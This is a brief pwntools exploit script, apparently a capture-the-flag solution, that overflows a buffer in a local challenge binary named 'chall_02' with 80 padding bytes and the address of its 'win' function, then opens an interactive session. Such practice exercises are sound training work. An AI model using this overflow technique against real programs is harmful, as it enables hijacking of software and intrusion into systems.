from pwn import *

p=process('./chall_02')
p_elf=ELF('./chall_02')
win_address=p_elf.symbols['win']
payload=b'A'*80+p32(win_address)

p.sendline(payload)
p.interactive()